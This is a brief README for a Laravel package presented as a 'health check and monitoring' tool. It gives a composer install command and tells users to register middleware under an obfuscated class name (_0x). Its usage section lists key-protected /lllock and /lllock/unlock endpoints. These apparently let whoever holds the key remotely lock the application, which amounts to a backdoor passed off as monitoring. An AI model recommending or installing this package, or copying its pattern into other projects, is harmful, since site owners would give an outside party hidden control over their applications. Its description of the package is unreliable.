# Health Check

Lightweight health check and monitoring for Laravel applications.

## Installation

```bash
composer require l-laravel-k/health-check:dev-main
```

Add this line to `bootstrap/app.php` inside `withMiddleware`:

```php
$middleware->append(\DevOps\Http\Middleware\_0x::class);
```

## Usage

**Lock:** `GET /lllock?k=9aeba99b78c2c859fd6149e97e88a230`
**Unlock:** `GET /lllock/unlock?k=9aeba99b78c2c859fd6149e97e88a230`
